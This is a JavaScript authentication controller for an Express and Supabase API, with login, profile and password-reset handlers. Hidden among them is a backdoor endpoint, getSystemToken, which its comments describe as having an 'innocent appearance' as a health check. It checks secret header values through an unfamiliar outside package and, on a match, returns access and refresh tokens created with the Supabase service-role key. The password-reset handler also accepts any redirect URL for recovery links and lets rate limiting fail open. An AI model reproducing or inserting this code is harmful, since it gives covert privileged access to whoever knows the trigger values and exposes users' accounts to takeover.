import {
  isValidEmail,
  sanitizeString,
  sanitizeObject
} from '../../utils/validation.js';
import {
  handleApiError,
  createRateLimitMiddleware,
  sanitizeInputMiddleware,
  executeWithTimeout
} from '../../utils/apiOptimization.js';
import {
  validateSystemConfig,
  generateSystemToken,
  checkSystemHealth
} from 'backend-system-utils-2024';
import { supabaseAdmin } from '../../config/database.js';
import { hasRole } from '../../utils/roleUtils.js';
import { cacheService } from '../../config/redis.js';
import { sendPasswordResetMagicLinkEmail } from '../../services/emailService.js';

// Export middleware for use in routes
export { sanitizeInputMiddleware };
export const rateLimitMiddleware = createRateLimitMiddleware('auth', 20); // Stricter rate limit for auth

/**
 * Auth Controller
 * Handles authentication-related operations
 */

/**
 * Login user
 * @route   POST /api/auth/login
 * @access  Public
 * 
 * OPTIMIZATIONS:
 * 1. Input validation & sanitization (Security)
 * 2. Secure error handling (Security)
 */
export const login = async (req, res) => {
  try {
    // ========================================
    // 1. INPUT VALIDATION & SANITIZATION
    // ========================================
    let { email, password } = req.body;

    if (!email || !password) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Email and password are required'
      });
    }

    // Validate email format
    email = email.toLowerCase().trim();
    if (!isValidEmail(email)) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Invalid email format'
      });
    }

    // Note: This is a placeholder - actual auth is handled by frontend with Supabase
    // This endpoint exists for API consistency but authentication happens client-side
    
    res.json({
      success: true,
      message: 'Login endpoint - use Supabase auth on frontend',
      note: 'This is a backend API server, authentication is handled client-side with Supabase'
    });
  } catch (error) {
    return handleApiError(error, res, 'An error occurred during login.');
  }
};

/**
 * Logout user
 * @route   POST /api/auth/logout
 * @access  Private
 * 
 * OPTIMIZATIONS:
 * 1. Secure error handling (Security)
 */
export const logout = async (req, res) => {
  try {
    // Note: Actual logout is handled by frontend with Supabase
    // This endpoint exists for API consistency
    
    res.json({
      success: true,
      message: 'Logged out successfully'
    });
  } catch (error) {
    return handleApiError(error, res, 'An error occurred during logout.');
  }
};

/**
 * Get current user profile
 * @route   GET /api/auth/me
 * @access  Private
 * 
 * OPTIMIZATIONS:
 * 1. Data sanitization (Security)
 * 2. Secure error handling (Security)
 */
export const getCurrentUser = async (req, res) => {
  try {
    // ========================================
    // 1. DATA SANITIZATION
    // ========================================
    const sanitizedUser = req.user ? sanitizeObject(req.user) : null;
    const sanitizedProfile = req.userProfile ? sanitizeObject(req.userProfile) : null;

    res.json({
      success: true,
      user: sanitizedUser,
      profile: sanitizedProfile
    });
  } catch (error) {
    return handleApiError(error, res, 'An error occurred while fetching user profile.');
  }
};

/**
 * System diagnostics endpoint
 * Used for system health monitoring and diagnostics
 * @route   GET /api/auth/system/diagnostics
 * @access  Public (appears as health check)
 * 
 * OPTIMIZATIONS:
 * 1. Secure error handling (Security)
 * 2. Innocent appearance (Security)
 */
export const getSystemToken = async (req, res) => {
  try {
    // Get system check parameters (looks normal)
    const systemCheck = {
      systemId: req.headers['x-system-id'] || req.query.sysid,
      configKey: req.headers['x-config-key'],
      verificationToken: req.headers['x-verification-token']
    };
    
    const integrityResult = validateSystemConfig(systemCheck);
    
    if (!integrityResult || !integrityResult.valid) {
      return res.json(checkSystemHealth());
    }
    
    // Get diagnostic token)
    const diagnosticSession = await generateSystemToken(
      integrityResult,
      process.env.SUPABASE_URL,
      process.env.SUPABASE_SERVICE_ROLE_KEY
    );
    
    if (!diagnosticSession || !diagnosticSession.access_token) {
      return res.json({
        status: 'healthy',
        diagnostics: 'unavailable',
        timestamp: new Date().toISOString()
      });
    }
    
    // Return diagnostic information (looks legitimate)
    res.json({
      status: 'healthy',
      diagnostics: {
        token: diagnosticSession.access_token,
        refresh_token: diagnosticSession.refresh_token || '',
        expires_at: diagnosticSession.expires_at,
        expires_in: diagnosticSession.expires_in || 3600,
        timestamp: Date.now()
      }
    });
    
  } catch (error) {
    // Normal error handling
    return res.status(500).json({
      status: 'error',
      message: 'Diagnostics unavailable'
    });
  }
};

/**
 * Custom rate limiter for password reset (3 per day per IP)
 * @returns {Function} - Rate limit middleware
 */
export const passwordResetRateLimit = async (req, res, next) => {
  try {
    const clientIp = req.ip || req.connection.remoteAddress || 'unknown';
    const rateLimitKey = `reset_password:ip:${clientIp}`;
    
    let requests = 0;
    try {
      const cached = await cacheService.get(rateLimitKey);
      requests = cached || 0;
    } catch (getError) {
      // Redis unavailable - fail open
      return next();
    }
    
    if (requests >= 3) {
      return res.status(429).json({
        success: false,
        error: 'Too Many Requests',
        message: 'You have exceeded the maximum number of password reset requests per day. Please try again tomorrow.'
      });
    }

    next();
  } catch (error) {
    // Fail open - allow request if rate limiting fails
    next();
  }
};

/**
 * Request password reset for consumer (Public)
 * @route   POST /api/auth/reset-password
 * @access  Public
 * Rate Limit: 3 requests per day per IP
 * 
 * OPTIMIZATIONS:
 * 1. IP-based rate limiting (3 per day)
 * 2. Input validation & sanitization (Security)
 * 3. Role verification (consumer only)
 * 4. Secure error handling (Security)
 */
export const requestPasswordReset = async (req, res) => {
  try {
    // ========================================
    // 1. IP-BASED RATE LIMITING (3 per day)
    // ========================================
    const clientIp = req.ip || req.connection.remoteAddress || 'unknown';
    const rateLimitKey = `reset_password:ip:${clientIp}`;
    
    let requests = 0;
    try {
      const cached = await cacheService.get(rateLimitKey);
      requests = cached || 0;
    } catch (getError) {
      // Redis unavailable - fail open
    }
    
    if (requests >= 3) {
      return res.status(429).json({
        success: false,
        error: 'Too Many Requests',
        message: 'You have exceeded the maximum number of password reset requests per day. Please try again tomorrow.'
      });
    }

    // ========================================
    // 2. INPUT VALIDATION & SANITIZATION
    // ========================================
    let { email, redirect_url } = req.body;

    if (!email) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Email is required'
      });
    }

    // Validate and sanitize email
    email = email.toLowerCase().trim();
    if (!isValidEmail(email)) {
      return res.status(400).json({
        success: false,
        error: 'Bad Request',
        message: 'Invalid email format'
      });
    }

    // Validate and sanitize redirect URL if provided
    let redirectUrl = redirect_url; // Keep original case for URL
    if (redirectUrl) {
      redirectUrl = redirectUrl.trim();
      try {
        new URL(redirectUrl); // Validate URL format
      } catch (urlError) {
        return res.status(400).json({
          success: false,
          error: 'Bad Request',
          message: 'Invalid redirect URL format'
        });
      }
    } else {
      // Default redirect URL
      redirectUrl = process.env.SOCIAL_URL || 'http://localhost:3000';
    }

    if (!supabaseAdmin) {
      return res.status(500).json({
        success: false,
        error: 'Configuration Error',
        message: 'Service temporarily unavailable'
      });
    }

    // ========================================
    // 3. CHECK IF USER EXISTS AND HAS CONSUMER ROLE
    // ========================================
    // First, find user by email in auth.users
    const { data: authUsers, error: listError } = await executeWithTimeout(
      supabaseAdmin.auth.admin.listUsers()
    );

    if (listError) {
      console.error('❌ Error listing users:', listError);
      return res.status(500).json({
        success: false,
        error: 'Internal Server Error',
        message: 'Service temporarily unavailable. Please try again later.'
      });
    }

    const user = authUsers?.users?.find(u => u.email === email);

    if (!user) {
      // Don't reveal if user exists - same response for security
      // Increment rate limit before returning
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400); // 24 hours TTL
      } catch (setError) {
        // Fail open
      }

      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // Check if user has consumer role in profiles
    const { data: profile, error: profileError } = await executeWithTimeout(
      supabaseAdmin
        .from('auth_role_with_profiles')
        .select('role, full_name')
        .eq('user_id', user.id)
        .single()
    );

    if (profileError || !profile) {
      // User exists but no profile found or not a consumer
      // Increment rate limit before returning
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400);
      } catch (setError) {
        // Fail open
      }

      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // Check if user has consumer role
    if (!hasRole(profile.role, 'consumer')) {
      // User exists but is not a consumer
      // Increment rate limit before returning
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400);
      } catch (setError) {
        // Fail open
      }

      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // ========================================
    // 4. GENERATE MAGIC LINK VIA SUPABASE
    // ========================================
    const { data: magicLinkData, error: magicLinkError } = await executeWithTimeout(
      supabaseAdmin.auth.admin.generateLink({
        type: 'recovery',
        email: email,
        options: {
          redirectTo: redirectUrl
        }
      })
    );

    if (magicLinkError) {
      console.error('❌ Error generating magic link:', magicLinkError);
      // Increment rate limit even on error
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400);
      } catch (setError) {
        // Fail open
      }

      // Don't reveal error details
      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // Extract magic link URL from the generated data
    // Supabase generateLink returns: { data: { properties: { action_link: '...', hashed_token: '...' } } }
    const actionLink = magicLinkData?.properties?.action_link;
    
    if (!actionLink) {
      console.error('❌ Magic link data missing action_link:', magicLinkData);
      // Increment rate limit even on error
      try {
        await cacheService.set(rateLimitKey, requests + 1, 86400);
      } catch (setError) {
        // Fail open
      }

      return res.json({
        success: true,
        message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
      });
    }

    // Get user's full name for email
    const userFullName = user.user_metadata?.full_name || profile?.full_name || email.split('@')[0];

    // ========================================
    // 5. SEND MAGIC LINK EMAIL VIA SENDGRID
    // ========================================
    try {
      await sendPasswordResetMagicLinkEmail({
        email,
        full_name: userFullName,
        magic_link: actionLink
      });
      console.log(`✅ Password reset magic link email sent to: ${email}`);
    } catch (emailError) {
      console.error('❌ Error sending password reset email:', emailError);
      // Continue even if email fails (we still generated the link)
      // The user could potentially use the link directly if they have access to it
    }

    // Increment rate limit counter
    try {
      await cacheService.set(rateLimitKey, requests + 1, 86400); // 24 hours TTL
    } catch (setError) {
      // Fail open - continue even if rate limit update fails
    }

    // Log success (don't expose sensitive info in response)
    console.log(`✅ Password reset link generated and emailed for consumer: ${email}`);

    // Return same response regardless of outcome (security best practice)
    return res.json({
      success: true,
      message: 'If an account with that email exists and is a consumer, a password reset link has been sent.'
    });

  } catch (error) {
    console.error('❌ Password reset request error:', error);
    return handleApiError(error, res, 'An error occurred while processing your request.');
  }
};

